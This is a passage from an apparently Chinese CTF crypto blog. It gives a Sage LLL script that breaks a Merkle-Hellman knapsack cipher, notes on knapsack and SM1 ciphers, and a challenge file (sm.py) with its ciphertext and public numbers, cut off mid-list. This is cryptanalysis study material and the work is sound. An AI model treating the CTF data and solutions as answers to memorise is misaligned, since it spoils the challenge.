style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">且</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">每</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">块</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">消</span><span class="mord cjk_fallback">息</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">的</span></span></span></span></span></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># open the public key and strip the spaces so we have a decent array</span></pre></td></tr><tr><td data-num="3"></td><td><pre>fileKey <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"pub.Key"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>pubKey <span class="token operator">=</span> fileKey<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>nbit <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pubKey<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># open the encoded message</span></pre></td></tr><tr><td data-num="7"></td><td><pre>fileEnc <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"enc.txt"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>encoded <span class="token operator">=</span> fileEnc<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">print</span> <span class="token string">"start"</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># create a large matrix of 0's (dimensions are public key length +1)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>A <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nbit <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nbit <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment"># fill in the identity matrix</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span>nbit<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment"># replace the bottom row with your public key</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span>nbit<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    A<span class="token punctuation">[</span>i<span class="token punctuation">,</span> nbit<span class="token punctuation">]</span> <span class="token operator">=</span> pubKey<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token comment"># last element is the encoded message</span></pre></td></tr><tr><td data-num="19"></td><td><pre>A<span class="token punctuation">[</span>nbit<span class="token punctuation">,</span> nbit<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token builtin">int</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>res <span class="token operator">=</span> A<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> nbit <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment"># print solution</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    M <span class="token operator">=</span> res<span class="token punctuation">.</span>row<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    flag <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">for</span> m <span class="token keyword">in</span> M<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">if</span> m <span class="token operator">!=</span> <span class="token number">0</span> <span class="token keyword">and</span> m <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            flag <span class="token operator">=</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">if</span> flag<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token keyword">print</span> i<span class="token punctuation">,</span> M</pre></td></tr><tr><td data-num="32"></td><td><pre>        M <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> M<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token comment"># remove the last bit</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        M <span class="token operator">=</span> M<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        M <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>M<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token keyword">print</span> M</pre></td></tr></table></figure><p>这套公钥加密体系，被称为子集和密码系统，或称背包密码。其核心思想是生成一个超级递增序列，然后用模线性运算进行混淆，将混淆之后的序列作为公钥。背包密码体制是 Merkle 和 Hellman1978 年提出，但随即两年后改体制就被破解，破解思想是不比找出正确的模数 m 和乘数 w，只需要找出任意模数 m' 和乘数 w' 再去乘公开的背包向量，能够产生超递增的背包向量即可</p>
<h1 id="国密"><a class="anchor" href="#国密">#</a> 国密</h1>
<h2 id="sm1"><a class="anchor" href="#sm1">#</a> SM1</h2>
<p>SM1 为对称加密，密钥长度和分组长度均为 128 位。其加密强度与 AES 相当。该算法不公开，调用该算法时，需要通过加密芯片的接口进行调用。</p>
<p>继续刷攻防世界的题，我发现这里的密码题比 buu 里的要难不少，才第 2 页就已经 5 星往上了，很巴适。</p>
<h3 id="smpy"><a class="anchor" href="#smpy">#</a> <span class="exturl" data-url="aHR0cDovL3NtLnB5">sm.py</span></h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span>long_to_bytes<span class="token punctuation">,</span>bytes_to_long</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> random <span class="token keyword">import</span> randint</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">gen512num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    order<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">512</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        tmp<span class="token operator">=</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span> tmp <span class="token keyword">not</span> <span class="token keyword">in</span> order<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            order<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    ps<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        p<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token operator">-</span>order<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        pre<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token operator">-</span>order<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"1"</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>pre<span class="token operator">+</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>pre<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">return</span> ps</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    choose<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    ps<span class="token operator">=</span>gen512num<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">print</span> <span class="token string">"gen over"</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    bchoose<span class="token operator">=</span><span class="token builtin">bin</span><span class="token punctuation">(</span>choose<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    r<span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    bchoose <span class="token operator">=</span> <span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>bchoose<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>bchoose</pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token keyword">if</span> bchoose<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            r<span class="token operator">=</span>r<span class="token operator">^</span>ps<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    key<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>choose<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    aes_obj <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    ef<span class="token operator">=</span>aes_obj<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"base64"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"r"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ef"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>ef<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    gg<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">for</span> p <span class="token keyword">in</span> ps<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        gg<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ps"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>gg<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>run<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>并且附带了三个 txt</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#ef</span></pre></td></tr><tr><td data-num="2"></td><td><pre>5eFo3ANg2fu9LRrFktWCJmVvx6RgBFzd0R8GXQ8JD78<span class="token operator">=</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#ps</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">12269477678599067519781256001818656329041551919143463830255138003182266704954352654920586885461104156925850407559021549528473021568243699272802197032665088</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">12014727898312193267046055214060352802848921408918989730190683994036519370635023422596726701736804151479296679824304931954850976170838814845998112601800704</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">9976331664429440060604845605243289732145662105018529082352225988075436122690201079192471745138682281749114251004821906977023803364650166488174264414371840</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">10403095102483566595716972508973051993255031477875636711702665373897460658213382301738287363537278081617423984664147130692144766769696306426472874358341632</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">9935007444417122587828364319155259331422002760411169639614085926257125957289535387056039742077708823587484732619886478426046889352924701091181760853573632</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">7816144451280221903045360686214708219123150580962711278805529207058066513313564034005865141540085194928850852259717606430081426247608273668550963327139840</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">12517448852230644543843194839452290981564805133542790216654745790268956278736772213561347159059078752045194109348946202792424835520299443538300142111162368</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">6789768146601458580589760600312758450701175172925541910997361627318269175816973906065173149393133804600948959104778828100004827313659377930320385195114496</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">8624404263723758129304199617536652852633986553875479275646179962368437825733711233129564473452692686422337758131596971267505467316197182315914355117564944</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">8559840094531596332946739089086545151599481121791025432208006961271455171540222994745321623482262271559943420731595676441376359208549675343226242909339648</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">6926126029730957418456137043360565121684145914641861486207124482231117881086559037064552963245530467008947891458682886428809882319459128341743705694142464</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">10997925984049192307339458336239986926295720310891432202069443289762945918727532734418050714064653027376329869372832544953496155101931061855255596598158016</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token number">12511941558854323325222072645706387918957199910524177276675347649438259153418331785744702413228028807937738592540253173338549970827817815597301399029809152</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token number">8124775960528718848833072854507558589293197110878856227449619954619501764995170037041995372597725216427602460805063384996150356624477459859583478177726464</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">7133494434906424803598366820528083453875037448763236640891176300757659237397412334675671120425494123377975279108545831814714207728133901568060841089040384</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token number">12886267646319573718833710925971341144530912979850023434953976446069299395642673444496033346019456835340496082788825446022310838978207194500322622057742336</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token number">13247053777060823638501536868414978922627294773882381071342105304292901325917600611701971635776630804195035683992920602320903899546059535084565462308093952</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token number">8039346969181209121545296348525604261962892631469173126458058793733782243091491694067276670887848146082468206916532031345992862828007076307708728422957056</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token number">7497693206105230439770126263364391614417834917569846932277971265409692068412929734786347003366855217087174226963131926690678571741118381810299410380226560</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token number">12546933311156552869703832118462665998177407938181409691735083101909018447031324030568658004231184098223678075937764742237430961697624521858718967546249216</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token number">8112064310331576963405160611632806992347550876641031309955302774748802683934962987894561482775815905542658127319085631490955167032011584382359881664954368</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token number">9397616884187166855269904307161954002744228832732212153178563290015283802477288654530810934676576244903011236937002033622912454704413614211733152501596160</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token number">7735951984042241855941767883847649747678856368220664859893795390166676191278561774856787423374615206955484619204027412670599244002776336946318843075100672</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token number">8005630214146619055663297226846917321520895320401904746592607177479724309153470184655824281365809531138120304269859347786199616766400315161333532381413376</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token number">7656052656794532137568115902700987207716560072900659942851655028472117429208730906342606463386292661937197018712388611701826202755780359524305317581029376</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token number">12245963042950438210111759352728138923374588698420633834241639378503761543884219793213593763988139100913754039865616138681288824739278749905766387420233728</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token number">10285141464717338743933615711584183433033727754279597020638992436765795250979525104509150691191227650047401432451553424365400857559804094345331915412733952</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token number">12685424337152851050120169001382095775137028728632722137145913366767301087682336621333117468063896241502438202783329164074393893888762160386229584355393536</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token number">11312837940889066302765583592236182670060714911124831912454254968140238400374555261676581439078324767113464380344847605407854838622579918392303391348883456</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token number">11862408230648646824379135327053646841887178264175531603686799216636057893475396521532587109687115324752211381274444360146541619677102512784127633129472000</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token number">11586559788323785798132863254053156938609770716760857925843839816360341130066860520519581722934525936451553514593323041552847881749539610299565289636888576</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token number">10275579469154513209334526170019007941887389637154766329795022807287377909230890084032685997043147348540771585421005876846815430545316901296945336680448000</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token number">11060169256739487758359281857455577951697173221779953479202322477422299899699183564084773431971239890143158491109177050084864154636183725624573489648261120</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token number">7484535899840363082723205781061868227326121379099409743060561334440530351457497817563978845648369349638983838067294416694027174558812356876448625980342272</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token number">13080259813261561203905280485860084814745391247113407567923526532119479281798561044832205623167889332749509826714509840490560724311018426218809011923320832</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token number">8017032239401337186908657242271906525548098497408853888966102778376382128532914166154441849038627610449540122214818651322112179508878618269303460118921216</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token number">8133031594124338230947609411576145106266723931346561614308989446260491235948112604728707144386004872218060597196614389784879656421717161899091227419082752</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token number">7113324503331575609588955842219492992286125160090656751966926632833509862645633934867010072188072235583762270324022108653700267520623388697937200059252736</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token number">11528934867922800398510957391398858480396321323765481691549343851866739151025955782241380423893137793493528149982548338089797671301174760797186870191587328</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token number">11035291335758645644319598596722215843847128182979661692408122913440606574943737298702214276059847445015122663721022317188279728883248790216530810376290304</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token number">6744724264767810731276221927492638455951176358183419231637194759015207470188114274774040795158569911395923975933128058146398869555974993721465306192281600</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token number">12196816509268020014036111694129611044102546216659995568068203737987504033396231275246809262527886886490201034475903071889177680812231390626015328769933312</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token number">7147180627590221191329551175374243775135385821794780746671747085468551364000970029897471139131090568023232661215879440510380681900083893809025155740991488</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token number">7259570700721773911449764787711325294045712386608685191007791327293448539811782374249228711472359997868841968952213694651014734586449886888770974190141440</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token number">10983476083473689964041374191280649726552640444660701856918720187317848675977097688367559487398585803274767149557494113137528100175676787590403018668900352</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token number">8473167340158138453207882645257050945376739496587311856478385717942233181878873656653527132133946865516769594755305136405340050225362638297392371220873216</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token number">7020891434764732959161134297720118498346770791208051290652325833643326586403413702043875419458112774100793094569233319716148659466835205340621626444611584</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token number">12267031303090791657874428388861427822931866067546385298588634401940261402026517894425054670991325828922947848768031366107041668905705510467348657141186560</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token number">8756628678991673161272425988730385346361939465326962119983077723945714031899751667758236101810537197221601994127198357973628536585860289680171046239469568</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token number">8794029695992999708040926039293018879550507411380751321243794671455218782615434051766340936705145234549457325576894124880750014248324592888848700263104512</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token number">11208089441436389762925161521937699497189782365651453839190789644361162118889605675920316796123895834084636006452765683135559886413111585814596878466023424</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token number">9112839643066755951636087956943305435169083917425922328183796736732881471395009016622610996143306771833616880251563446563681017182395773850614883978051584</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token number">10340349297034620868066310578432000274213307826211457212218480849254475426587439286422057290163056241109549262433841093294046724396912778589796056743018496</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token number">8003692696295517246900223426880619563184296020092634287346589313723587949135901307158098489973009938304405633144137397833880989304541002097015269982470144</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token number">9394831047632963274965474961044801392642306981058123724811545169543659031023890557590233826097596421918105404597590570182143600423373093274416611527229440</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token number">7521060591838734671865608692057702970568959138196469197891685004825194794558492211410587376082424989492082994630611580622367868389798376062862241550041088</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token number">12659981509744233609440995482344345640812619050031306842355953524340754352370120040675004219135213972616432058333058816921005971638282394622437084670984192</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token number">12771346311546917175547722064993142477635625878393791624978925489905677963420618138358962111629501097295039627362675588297160323306628946209079369383542784</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token number">12245110957094807635564128908586831532236632235330259858875037270649848508417424287275968028265737166324904376189422996436418465201157396846307045873287168</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token number">9235818726765267281515922791025137569322412683461346431156747050886895759530737544863803672010449601616272582392631231877795296633670583614968239566618624</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token 